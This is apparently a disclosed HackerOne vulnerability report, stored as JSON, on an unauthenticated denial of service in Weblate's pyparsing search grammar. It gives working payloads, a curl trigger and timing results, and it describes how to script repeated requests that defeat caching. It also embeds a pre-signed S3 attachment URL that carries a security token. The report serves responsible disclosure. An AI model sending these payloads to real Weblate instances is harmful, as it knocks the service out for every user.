@@ -1,0 +1,124 @@
+{
+  "id": 3898281,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODk4Mjgx",
+  "url": "https://hackerone.com/reports/3898281",
+  "title": "Unauthenticated ?q= search query causes exponential pyparsing backtracking under a process-global lock in Weblate",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-29T08:03:02.034Z",
+  "submitted_at": "2026-07-29T08:03:02.290Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "type5afe",
+    "url": "/type5afe",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/a8t1gcsr5qaauujrjav1q4asf89z/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19468,
+    "url": "https://hackerone.com/weblate",
+    "handle": "weblate",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Weblate",
+      "twitter_handle": "WeblateOrg",
+      "website": "https://weblate.org/",
+      "about": "Weblate is a libre software web-based continuous localization system"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-04T08:10:22.596Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-08-05T08:10:14.085Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nWeblate's search-query grammar (`weblate/utils/search.py:174-227`) is built with\n`pyparsing.infix_notation` over a term rule that is ambiguous at every position, and packrat\nmemoization is never enabled. Parsing a query with nested parentheses therefore backtracks\nexponentially: cost grows ~4× per nesting level, so a **33-byte** query string consumes\n**52 seconds of CPU**. The parse runs inside `parse_string()` while holding the module-level\n`PARSER_LOCK` (`weblate/utils/search.py:1237`), so a single request stalls *every other* search,\nbrowse, translate and zen page served by the same worker process.\n\nThe `browse`, `translate` and `zen` views (`weblate/trans/views/edit.py:1823`, `:1264`, `:1646`)\nparse `?q=` during form validation with **no authentication decorator and no rate limiting** — the\n`check_rate_limit(\"search\", …)` guard exists only in the separate `weblate/trans/views/search.py`\nview. On any project readable anonymously (the normal configuration for a public Weblate\ninstance), an unauthenticated attacker denies service with single short GET requests.\n\nPre-auth, default configuration.\n\n## Proof of Concept\n\n### Setup\n\n### File\n{F6346667}\n\n\n```\ngit clone https://github.com/WeblateOrg/weblate\ncd weblate && git checkout e3952598329d1e4f5e765260948e0c8384ddabe9\npython3 -m venv venv && venv/bin/pip install 'pyparsing==3.3.2'   # pyproject.toml:190\nvenv/bin/python poc.py\n```\n\n`poc.py` does **not** retype the grammar. It lifts the exact source text of `build_parser`,\n`RegexExpr` and `RangeExpr` out of `weblate/utils/search.py` and `RawQuotedString` out of\n`weblate/checks/parser.py` using `ast.get_source_segment`, then `exec`s those definitions against\na namespace containing only pyparsing symbols. What is measured is the target's own grammar. The\nterm parse action is swapped for a counter so no Django or database is required; the parse action\nruns only on a successful term match and therefore cannot account for the cost — the blowup is\nequally visible on inputs that fail to parse.\n\n### Trigger\n\nAgainst a live instance, no authentication:\n\n```\ncurl -sG 'https://weblate.example/browse/<project>/<component>/<lang>/' \\\n     --data-urlencode 'q=(a (a (a (a (a (a (a (a a))))))))'\n```\n\nStandalone measurement:\n\n```\nvenv/bin/python poc.py\n```\n\n### Result\n\n```\n--- nested_parens ---\n  n=1   len=3         0.0029s         -  parsed\n  n=2   len=5         0.0072s      2.5x  parsed\n  n=4   len=9         0.1307s     18.0x  parsed\n  n=6   len=13        1.9561s     15.0x  parsed\n  n=8   len=17       28.8399s     14.7x  parsed\n\n--- unbalanced_open ---\n  n=8   len=9        29.2494s     15.3x  ParseException\n\n--- nested_paren_terms ---\n  n=8   len=33       52.4289s     15.9x  parsed\n\n--- not_chain ---\n  n=16  len=65       22.2754s     18.6x  parsed\n```\n\nRatio ≈16× per two nesting levels ⇒ ≈4× per level ⇒ O(4ⁿ).\n\nSmallest payloads crossing each threshold (Part 2):\n\n```\n  nested_parens        >    1s at n=6   len=13      1.832s  (parsed)          payload='((((((a))))))'\n  nested_parens        >   10s at n=8   len=17     30.498s  (parsed)          payload='((((((((a))))))))'\n  unbalanced_open      >    1s at n=6   len=7       1.750s  (ParseException)  payload='((((((a'\n  unbalanced_open      >   10s at n=8   len=9      28.726s  (ParseException)  payload='((((((((a'\n  nested_paren_terms   >    1s at n=6   len=25      3.154s  (parsed)          payload='(a (a (a (a (a (a a))))))'\n  nested_paren_terms   >   10s at n=7   len=29     12.855s  (parsed)          payload='(a (a (a (a (a (a (a a)))))))'\n  not_chain            >    1s at n=12  len=49      1.473s  (parsed)          payload='NOT NOT ... a'\n  not_chain            >   10s at n=16  len=65     21.625s  (parsed)          payload='NOT NOT ... a'\n```\n\n**Nine bytes** (`((((((((a`) — an input that is not even a valid query — cost 28.7 s.\n\nProcess-global lock amplification (Part 3):\n\n```\n  baseline victim parse (uncontended): 0.751 ms\n  attacker payload: '(a (a (a (a (a (a (a (a a))))))))' (33 bytes)\n  attacker parse: 53.057 s\n  victim0 parse:   52788.28 ms (70,295x baseline)\n  victim1 parse:   52777.23 ms (70,281x baseline)\n  victim2 parse:   52762.12 ms (70,261x baseline)\n  victim3 parse:   52751.40 ms (70,246x baseline)\n```\n\nFour unrelated, entirely benign queries (`source:hello AND target:world`) went from sub-millisecond\nto **52.8 seconds** — a **70,000×** slowdown — purely by waiting on `PARSER_LOCK` while one\nattacker request was parsed.\n\n## Impact\n\n- **Realistic exploitation**: an attacker scripts unauthenticated GETs to\n  `/browse/<any-public-project>/…/?q=(a (a (a (a (a (a (a (a b))))))))`, varying the final letter\n  each time to defeat the `lru_cache`. Each request pins one worker thread for ~52 s and blocks all\n  other query parsing in that process. A handful of concurrent connections is enough to make the\n  translation UI unusable for every user of the instance. There is nothing to clean up and nothing\n  is logged as anomalous — the requests are well-formed and, for the balanced-paren family, are\n  even *valid* queries that return normal results eventually.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6346667,
+      "file_name": "poc.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mvj3uyuc4puof3shlzslsjqv1qdx?response-content-disposition=attachment%3B%20filename%3D%22poc.py%22%3B%20filename%2A%3DUTF-8%27%27poc.py&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUPH34JHM%2F20260904%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260904T102150Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIAtAMabmJw5%2B8FsWGj57FU%2F78zfwpt1HoxhEx6jKVbtQAiEAyJq2Dhddly%2BgqmTIrLXmry9zJpE2laEWPg6kbNlYPg4quwUI8%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDPvjgsQ1rpOHBQJbICqPBX51g80jHbJ5lkdE3CLAz9agvngecoAInZoB8XbhgLNZ849TZkNuENwuu9EtnxZjnWen3QVBUU2LkfRuJ57FnM94TXhM9oW5xP23vUrAOXhj%2FmzcD6XOfObiUitPSwCaM67zLQtXBO4e8BZmVOxkNww3PMmGQMtNGkGN7g2xQeNGj%2BUO8InTe4b1%2BNEbveXkL14bThbrRqPubDGwCNNz4Phc%2FplRFTNSymnszi9hBgJEpR%2B0i75QEc2Prr5Tg8xSvDsCM4EWkUMz4cLBgGhtzyfCW9Ry%2BFVy%2BN4sBXShzjhVrsXNN3lwP9epOfPr%2BSE2fJs1nqtHCNcmXbbxBY9DvmR7Elx7JN4vYyBCdX5FubG4hOEPWuf1QztemfRE26m65XWUk1jOkZSvThtUND2IcdJXn4D0epHGT%2FJofXMVOq4x1CVEW7PYTMC4JyKve2%2FIYdrjemiQrFr3705CbT719SSg36clyQ%2F9hKik%2FZAq1%2BlHXZHwdzQh1S6u7vxWjLzUv65JTj83sNz9vfUYTAWC4vHYFZO%2BwxKyxsdD6sCIxS77qe6U1dBRJSyUqL%2FkZd9FAelQH0n5Ty98qlqo3vGVPTnzqeME4yQF9drOMwLMiq25gNkxvFzGqlTdHMjhDzQDy8M2AwUKRGavkX37XGqQP2%2B9sLHviNgq%2BxnIec35Ntis2eMHSYqyeUhx5FVKlxPlNzk3RYg64le5P4EltV4DYGW9coO4c7N%2FnGoqhfDV%2FeBJzXUnYz9ZHSVBncxidwQpc34rWDWRX0SYMHgylotPwz7OgAexV7OqfAtmGq7M0pMEFmDX18ItCwAe1UnPceahElFCSi6l9sV2%2BO6Q1IXtRLgPMAKjKUHj1Tghn5qb7Mgw3Z7q1AY6sQGNwt6%2BpZmXW6OrzOsp7hoRZOP3PmEi14ACrI04uvPFEOrLihNj9vET4BB06PlePLcvqD5as%2FflwNzQ0IqkuD0BeZPwj4TRAAjKy3jyiYYDNxwgM0yiC1g4%2BZw3S6xnDKe%2FJVCN0pvgMKXzm2yuDvgDS9dbd8zIQ6ZkN25P2%2BRILAkqOWF%2FQ3V4o11b1CG50HMcjUTR0XxCIouB9s2OadE9sbJcBWFAttD4TP8qcGnOt8M%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e28a1e318880a97f83931d5d184389cbc16100752c7bbe697c99f7f1eb847dc0",
+      "file_size": 6701,
+      "type": "application/x-sh",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-09-04T08:10:14.727Z",
+  "allow_singular_disclosure_after": -7896.166512207,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "stackraid"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 173,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/WeblateOrg/weblate",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
